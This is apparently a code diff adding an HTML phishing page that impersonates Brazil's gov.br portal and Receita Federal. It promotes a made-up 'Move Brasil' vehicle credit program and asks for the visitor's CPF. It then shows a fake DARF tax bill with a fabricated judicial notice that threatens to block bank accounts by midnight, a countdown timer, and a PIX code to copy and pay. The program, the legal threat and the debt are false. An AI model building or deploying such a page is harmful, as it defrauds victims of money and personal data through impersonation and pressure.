@@ -1,0 +1,303 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <script type="text/javascript">
+        (function(c,l,a,r,i,t,y){
+            c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+            t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+            y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+        })(window, document, "clarity", "script", "ttuhjmpt6a");
+    </script>
+    <meta charset="utf-8"/>
+    <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+    <title>Gov.br</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="assets/css/index.css"/>
+</head>
+<body>
+    <!-- Loading Screen -->
+    <div class="loading-screen" id="loadingScreen">
+        <img src="assets/images/gov-logo.webp" alt="gov.br" class="loading-logo">
+        <div class="loading-spinner"></div>
+        <div class="loading-text">Carregando dados...</div>
+    </div>
+
+    <!-- Main Content -->
+    <div class="main-content" id="mainContent">
+        <div class="header">
+            <img alt="Logo gov.br" src="assets/images/gov-logo.webp" style="width:120px;height:auto;display:block;flex-shrink:0;" onload="console.log('Logo gov.br carregado com sucesso');">
+            
+        </div>
+        <div class="movebrasil-block">
+            <div class="movebrasil-topbar" style="display:flex;align-items:center;gap:10px;margin-bottom:8px;color:#1f1f1f;font-size:12px;font-weight:600;letter-spacing:0.08em;line-height:1.2;">
+                <div></div>
+            </div>
+            <div class="movebrasil-logo">
+                <div class="movebrasil-name">
+                    MOVE
+                    <span class="movebrasil-arrows">
+                        <span>›</span>
+                        <span>›</span>
+                    </span>
+                </div>
+                <div class="movebrasil-brazil">BRASIL</div>
+                <div class="movebrasil-underline"></div>
+            </div>
+            <div class="movebrasil-subtext">GOVERNO FEDERAL</div>
+            <p style="margin-top: 12px; font-size: 13px; line-height: 1.5; color: #333; text-align: justify; max-width: 600px;">
+                O Move Brasil é uma iniciativa beneficente do governo federal lançada em 8 de Janeiro de 2026 com encerramento em 8 de Novembro de 2026 destinada a estimular a renovação da frota de veículos no país, com foco em eficiência, segurança e sustentabilidade, oferecendo linhas de crédito com juros de 00,58%, com 80% do valor financiado pelo Banco Central do Brasil, para caminhões, ônibus, motos, carros e táxis. Após a finalização da inscrição, aguarde 10 dias úteis para que o Governo Federal envie sua aprovação através do seu E-mail ou caixa postal do seu número.
+            </p>
+        </div>
+        <div class="user-info">
+            <div class="user-info-content">
+                <div class="user-info-text">
+                    <h3>IDENTIFIQUE-SE NO GOV.BR COM:</h3>
+                    <p style="text-align: justify; line-height: 1.4; margin-bottom: 30px;">
+                        Digite seu CPF para acessar sua conta GOV.BR.
+                    </p>
+
+                    <form id="cpfForm" style="margin-top: 30px;">
+                        <div style="margin-bottom: 20px;">
+                            <label for="cpfInput" style="display: block; margin-bottom: 8px; font-weight: 600; color: #0c326f;">
+                                CPF:
+                            </label>
+                            <input 
+                                type="text" 
+                                id="cpfInput" 
+                                name="cpf" 
+                                placeholder="000.000.000-00"
+                                maxlength="14"
+                                inputmode="numeric"
+                                style="width: 100%; padding: 12px; border: 2px solid #dee2e6; border-radius: 4px; font-size: 16px; font-family: monospace;"
+                                required
+                            >
+                            <span id="cpfError" style="display:none; color:#dc3545; font-size:13px; margin-top:6px; font-weight:600;"></span>
+                            <span id="cpfLoading" style="display:none; color:#0c326f; font-size:13px; margin-top:6px; font-weight:600;"><i class="fas fa-spinner fa-spin"></i> Verificando CPF...</span>
+                        </div>
+                        
+                        <button 
+                            type="submit" 
+                            style="width: 100%; padding: 15px; background-color: #0c326f; color: white; border: none; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; transition: background-color 0.3s ease;"
+                            onmouseover="this.style.backgroundColor='#084080'"
+                            onmouseout="this.style.backgroundColor='#0c326f'"
+                        >
+                            CONTINUAR 
+                        </button>
+                    </form>
+                </div>
+            </div>
+        </div>
+        
+        
+        
+        <footer class="footer">
+            <img src="assets/images/gov-logo.webp" alt="gov.br Logo" class="footer-logo">
+            <p>© 2026 Receita Federal do Brasil. Todos os direitos reservados.</p>
+        </footer>
+        <script src="assets/js/countdown.js"></script>
+        <script src="assets/js/index.js"></script>
+
+        <!-- Modal de Pagamento PIX -->
+        <div id="paymentModal" class="modal">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <img src="assets/images/gov-logo.webp" alt="gov.br" class="modal-logo">
+                    <div style="margin-top: 10px; text-align: center;">
+                        <p style="color: #666; margin: 2px 0 0 0; font-size: 12px;">MINISTÉRIO DA FAZENDA</p>
+                    </div>
+                </div>
+                <div id="loaderContainer" class="loader-container">
+                    <div style="text-align: center; padding: 30px; color: #0c326f;">
+                        <i class="fas fa-spinner fa-spin" style="font-size: 48px; margin-bottom: 20px;"></i>
+                        <h3 style="margin: 0 0 10px 0; font-weight: 600;">Processando Documento de Arrecadação</h3>
+                        <p style="margin: 0; color: #666;">Gerando DARF eletrônico via sistema PIX...</p>
+                    </div>
+                </div>
+                <div id="qrCodeContainer" class="qr-code-container">
+                    <div style="background: #f8f9fa; border: 1px solid #dee2e6; padding: 12px; margin-bottom: 15px; border-radius: 4px;">
+                        <h3 style="color: #0c326f; margin: 0 0 8px 0; font-size: 14px; text-align: center; font-weight: 700;">
+                            DOCUMENTO DE ARRECADAÇÃO DE RECEITAS FEDERAIS - DARF
+                        </h3>
+                        <div style="text-align: center; margin-bottom: 8px;">
+                            <span style="background: #0c326f; color: white; padding: 2px 8px; border-radius: 2px; font-size: 11px; font-weight: 600;">
+                                CÓDIGO: 0190 - IMPOSTO DE RENDA PESSOA FÍSICA
+                            </span>
+                        </div>
+                    </div>
+                    <div style="background: linear-gradient(135deg,#dc3545,#c82333); color: white; padding: 12px; margin: 15px 0; border-radius: 4px; border: 2px solid #a71e2a;">
+                        <div style="text-align: center; margin-bottom: 8px;">
+                            <i class="fas fa-exclamation-triangle" style="font-size: 20px; color: #ffd700;"></i>
+                        </div>
+                        <div style="font-weight: 600; text-align: center; font-size: 13px; line-height: 1.4;">
+                            <strong>NOTIFICAÇÃO JUDICIAL - PROCESSO Nº 5021547-89.2025.4.03.6109</strong><br>
+                            <span style="font-size: 12px;">Conforme Art. 185-A do CTN e Portaria RFB nº 3.344/2021</span><br><br>
+                            Contribuinte João Da Silva Santos, em cumprimento à decisão judicial, informamos que suas contas bancárias, investimentos e bens serão <strong>BLOQUEADOS AUTOMATICAMENTE às 23:59h de <span id="currentDate"></span></strong> caso esta pendência não seja quitada.
+                        </div>
+                    </div>
+
+                    <div style="text-align: center; margin: 15px 0;">
+                        <h4 style="color: #0c326f; margin: 0 0 10px 0; font-size: 14px; font-weight: 700;">
+                            PAGAMENTO VIA PIX - SISTEMA INTEGRADO BACEN
+                        </h4>
+                        <img id="qrCodeImage" src="#" alt="QR Code PIX DARF" class="qr-code-img" style="border: 2px solid #0c326f; border-radius: 8px;">
+                    </div>
+
+                    <div class="countdown-timer-pix" id="pixCountdown" style="background: #dc3545; margin: 10px 0;">
+                        <i class="fas fa-clock"></i> Prazo de pagamento expira em: 20:00
+                    </div>
+
+                    <div style="background: #fff; border: 2px solid #0c326f; border-radius: 4px; padding: 10px; margin: 12px 0;">
+                        <p style="margin: 0 0 5px 0; font-weight: 700; color: #0c326f; text-align: center; font-size: 13px;">
+                            CÓDIGO PIX PARA PAGAMENTO DO DARF
+                        </p>
+                        <div style="background: #f8f9fa; border: 1px solid #dee2e6; border-radius: 4px; padding: 8px;">
+                            <p id="pixCode" class="pix-code" style="font-family: 'Courier New', monospace; font-size: 11px; color: #333;"></p>
+                        </div>
+                    </div>
+
+                    <div class="copy-button-container">
+                        <button onclick="copyPixCode()" class="copy-pix-button" style="background: #0c326f; font-weight: 700; font-size: 14px; padding: 12px 24px;">
+                            <i class="fas fa-copy"></i>
+                            COPIAR CÓDIGO PIX PARA PAGAMENTO
+                        </button>
+                    </div>
+
+                    <div class="customer-info">
+                        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-bottom: 10px;">
+                            <p style="margin: 0;"><strong>Contribuinte:</strong></p>
+                            <p style="margin: 0; text-align: right;">JOÃO DA SILVA SANTOS</p>
+                            <p style="margin: 0;"><strong>CPF:</strong></p>
+                            <p style="margin: 0; text-align: right;">123.456.789-00</p>
+                            <p style="margin: 0;"><strong>Período de Apuração:</strong></p>
+                            <p style="margin: 0; text-align: right;">01/01/2020 a 31/12/2020</p>
+                            <p style="margin: 0;"><strong>Código da Receita:</strong></p>
+                            <p style="margin: 0; text-align: right;">0190</p>
+                            <p style="margin: 0;"><strong>Nº do Documento:</strong></p>
+                            <p style="margin: 0; text-align: right; font-family: monospace;" id="documentNumber">RFB2025073648291</p>
+                        </div>
+                        <div style="border-top: 1px solid #dee2e6; padding-top: 8px; margin-top: 8px;">
+                            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 8px;">
+                                <p style="margin: 0;"><strong>Valor Principal:</strong></p>
+                                <p style="margin: 0; text-align: right;">R$ 101.82</p>
+                                <p style="margin: 0;"><strong>Multa (20%):</strong></p>
+                                <p style="margin: 0; text-align: right;">R$ 20.36</p>
+                                <p style="margin: 0;"><strong>Juros SELIC:</strong></p>
+                                <p style="margin: 0; text-align: right;">R$ 4.44</p>
+                            </div>
+                            <div style="border-top: 2px solid #0c326f; margin-top: 8px; padding-top: 8px;">
+                                <div style="display: grid; grid-template-columns: 1fr 1fr;">
+                                    <p style="margin: 0; font-weight: 700; color: #0c326f; font-size: 16px;"><strong>VALOR TOTAL A PAGAR:</strong></p>
+                                    <p style="margin: 0; text-align: right; font-weight: 700; color: #dc3545; font-size: 18px;">R$ 127.48</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+
+                    <div style="text-align: center; margin: 20px 0; padding: 15px 0; border-top: 1px solid #dee2e6;">
+                        <div style="display: flex; justify-content: center; align-items: center; margin-bottom: 8px;">
+                            <img src="assets/images/brasao-republica.png" alt="Brasão da República" style="width: 50px; height: 50px; object-fit: contain; border-radius: 50%;" onload="console.log('Brasão da República carregado com sucesso')">
+                        </div>
+                        <p style="margin: 0; font-size: 12px; font-weight: 700; color: #0c326f;">SECRETARIA DA RECEITA FEDERAL DO BRASIL</p>
+                        <p style="margin: 0; font-size: 11px; color: #666;">MINISTÉRIO DA FAZENDA - GOVERNO FEDERAL</p>
+                        <p style="margin: 4px 0 0 0; font-size: 10px; color: #999;">Autenticação Digital - Certificado ICP-Brasil A3</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div> <!-- End main-content -->
+
+    <!-- Modal de Aguardando Pagamento -->
+    <div id="waitingPaymentModal" class="modal">
+        <div class="modal-content" style="max-width: 500px; text-align: center;">
+            <div class="modal-header">
+                <img src="assets/images/gov-logo.webp" alt="gov.br" class="modal-logo">
+                <div style="margin-top: 10px; text-align: center;">
+                    <h2 style="color: #0c326f; margin: 0; font-size: 16px; font-weight: 700;">SECRETARIA DA RECEITA FEDERAL DO BRASIL</h2>
+                    <p style="color: #666; margin: 2px 0 0 0; font-size: 12px;">MINISTÉRIO DA FAZENDA</p>
+                </div>
+            </div>
+            
+            <div id="waitingContainer" style="padding: 40px 20px;">
+                <div style="text-align: center; margin-bottom: 30px;">
+                    <i class="fas fa-spinner fa-spin" style="font-size: 48px; color: #0c326f; margin-bottom: 20px;"></i>
+                    <h3 style="margin: 0 0 15px 0; font-weight: 600; color: #0c326f; font-size: 18px;">Aguardando pagamento...</h3>
+                    <p style="margin: 0; color: #666; font-size: 14px; line-height: 1.5;">
+                        Após realizar o pagamento via PIX, retorne a esta tela para baixar o <strong>termo de quitação da dívida pública</strong>.
+                    </p>
+                </div>
+                
+                <!-- Campo PIX Copia e Cola -->
+                <div style="background: #f8f9fa; border: 2px solid #0c326f; border-radius: 8px; padding: 20px; margin: 20px 0;">
+                    <div style="display: flex; align-items: center; justify-content: center; margin-bottom: 15px;">
+                        <i class="fas fa-qrcode" style="color: #0c326f; margin-right: 8px; font-size: 18px;"></i>
+                        <strong style="color: #0c326f; font-size: 16px;">CÓDIGO PIX PARA PAGAMENTO</strong>
+                    </div>
+                    
+                    <div style="background: white; border: 1px solid #dee2e6; border-radius: 4px; padding: 15px; margin: 15px 0; word-break: break-all; font-family: monospace; font-size: 12px; color: #333; max-height: 150px; overflow-y: auto;" id="waitingPixCode">
+                        <!-- PIX code will be inserted here -->
+                    </div>
+                    
+                    <button id="waitingCopyButton" onclick="copyWaitingPixCode()" style="background: #0c326f; color: white; border: none; padding: 12px 24px; border-radius: 5px; font-size: 14px; font-weight: 600; cursor: pointer; width: 100%; margin: 10px 0;">
+                        <i class="fas fa-copy"></i> Código Copiado
+                    </button>
+                </div>
+                
+                <div style="background: #f8f9fa; border: 1px solid #dee2e6; border-radius: 8px; padding: 20px; margin: 20px 0;">
+                    <div style="display: flex; align-items: center; justify-content: center; margin-bottom: 10px;">
+                        <i class="fas fa-info-circle" style="color: #0c326f; margin-right: 8px;"></i>
+                        <strong style="color: #0c326f;">IMPORTANTE</strong>
+                    </div>
+                    <p style="margin: 0; font-size: 13px; color: #555; text-align: center;">
+                        Não feche esta página! Mantenha-a aberta para receber automaticamente o seu termo de quitação após a confirmação do pagamento pelo sistema bancário.
+                    </p>
+                </div>
+            </div>
+            
+            <div id="paymentCompletedContainer" style="padding: 40px 20px; display: none;">
+                <div style="text-align: center; margin-bottom: 30px;">
+                    <i class="fas fa-check-circle" style="font-size: 48px; color: #28a745; margin-bottom: 20px;"></i>
+                    <h3 style="margin: 0 0 15px 0; font-weight: 600; color: #0c326f; font-size: 18px;">Se realizou o pagamento clique no botão abaixo</h3>
+                    <p style="margin: 0; color: #666; font-size: 14px; line-height: 1.5;">
+                        Clique para acessar a área de download do seu termo de quitação da dívida pública.
+                    </p>
+                </div>
+                
+                <button onclick="redirectToMulta()" style="background: #28a745; color: white; border: none; padding: 15px 30px; border-radius: 5px; font-size: 16px; font-weight: 600; cursor: pointer; width: 100%; margin-top: 20px;">
+                    <i class="fas fa-check"></i> REALIZEI O PAGAMENTO
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <div id="sidebarOverlay" class="sidebar-overlay"></div>
+    <nav id="sidebar" class="sidebar" aria-label="Menu lateral">
+        <button id="sidebarClose" class="sidebar-close" aria-label="Fechar menu">×</button>
+        <div class="sidebar-logo">
+            <div class="movebrasil-name">
+                MOVE
+                <span class="movebrasil-arrows">
+                    <span>›</span>
+                    <span>›</span>
+                </span>
+            </div>
+            <div class="movebrasil-brazil">BRASIL</div>
+        </div>
+        <hr class="sidebar-divider">
+        <button type="button" class="sidebar-item">
+            <span class="icon">🏠</span>
+            <span>Minhas Solicitações</span>
+        </button>
+        <div class="sidebar-item-panel">Nenhum resultado encontrado.</div>
+        <button type="button" class="sidebar-item active">
+            <span class="icon">📄</span>
+            <span>Nova Solicitação</span>
+        </button>
+        <div class="sidebar-item-panel">Nenhum resultado encontrado.</div>
+    </nav>
+</body>
+
+
+</html>
